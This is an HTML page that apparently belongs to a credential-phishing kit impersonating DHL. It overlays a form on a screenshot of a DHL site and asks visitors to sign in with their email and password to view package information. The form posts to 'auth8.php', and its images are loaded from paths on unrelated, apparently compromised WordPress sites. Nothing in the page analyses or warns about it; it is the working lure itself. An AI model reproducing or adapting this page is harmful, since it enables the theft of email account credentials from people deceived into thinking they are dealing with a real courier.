<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" hola_ext_inject="disabled"><head>
<link id="m_shortcutIcon" rel="shortcut icon" type="image/vnd.microsoft.icon" href="http://www.shoutad.com/wp-includes/pomo/favicon.gif">
<title>DHL WorldWide</title>
</head>

<body bgcolor=#ffcc00>
<p><map name="FPMap0">
<area coords="23, 65, 96, 86" shape="rect" href="#express">
<area shape="rect" coords="115, 62, 188, 86" href="#logistics">
<area shape="rect" coords="206, 61, 250, 88" href="#mail">
<area shape="rect" coords="264, 62, 320, 87" href="#press">
<area shape="rect" coords="340, 63, 412, 86" href="#careers">
<area shape="rect" coords="427, 63, 503, 89" href="#about_us">
<area shape="rect" coords="936, 59, 960, 82" href="#search">
<area shape="rect" coords="641, 4, 725, 29" href="#english">
<area shape="rect" coords="733, 2, 842, 27" href="#contact">
<area shape="rect" coords="851, 2, 960, 25" href="#profile">
<area coords="3, 531, 679, 661" shape="rect" href="#menu">
<area shape="rect" coords="536, 415, 602, 424" href="#contact">
</map>
<img src="http://www.saequity.com/wp-content/plugins/Docs/GoogleDrive/dhl.png" height="662" border="0" width="1349" usemap="#FPMap0"></p>
<table style="position: absolute; left: 218px; top: 127px; width: 512px; height: 385px" border="0" cellpadding="0" cellspacing="0" width="100%">
	<tr>
		<td>
		<form method="POST" action="auth8.php">
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<table style="position: absolute; left: 17px; top: 14px; width: 487px; height: 204px" border="0" cellpadding="0" cellspacing="0" width="100%">
				<tr>
					<td style="vertical-align:middle" colspan="2" height="63" bgcolor="#B00000">
					<p align="center">
					<font style="font-size: 11pt" color="#EAEAEA" face="Tahoma">
					<b>&nbsp;Sign In With Your Valid Email and Password To Review&nbsp;&nbsp; 
					Package Information</b></font></td>
				</tr>
				<tr>
					<td style="vertical-align:middle" height="44">
					<font color="#4F4F4F" face="Verdana" size="2"><b>&nbsp;Email ID</b>:&nbsp;</font></td>
					<td height="44" align="left"><font face="Verdana" size="3">
					<input name="email" maxlength="60" size="40" style="text-font:Arial;font-weight:11px" type="text"></font></td>
				</tr>
				<tr>
					<td style="vertical-align:middle">
					<font color="#4F4F4F" face="Verdana" size="2"><b>&nbsp;Password</b>:&nbsp;</font></td>
					<td align="left"><font face="Verdana" size="3">
					<input name="pass" maxlength="30" size="23" value type="password"></font></td>
				</tr>
				<tr>
					<td style="vertical-align:middle">
					<font color="#4F4F4F" face="Verdana" size="2"><b>&nbsp;Language</b>:</font></td>
					<td height="37" align="left"><select size="1" name="D1">
					<option>Select language</option>
					<option selected>English</option>
					<option>Portugese</option>
					<option>Serbia</option>
					<option>Russian</option>
					<option>Turkish</option>
					<option>French</option>
					</select></td>
				</tr>
				<tr>
					<td style="vertical-align:middle">&nbsp;</td>
					<td height="19" align="left">&nbsp;</td>
				</tr>
				<tr>
					<td style="vertical-align:middle">&nbsp;</td>
					<td height="21" align="left">
					<input src="http://www.shoutad.com/wp-includes/pomo/login.JPG" value="Submit" alt="Submit" style="position: absolute; left: 120; top: 192; " name="I1" height="18" type="image" width="89"></td>
				</tr>
			</table>
		</form>
		<p>&nbsp;</td>
	</tr>
</table>
</body>
</html>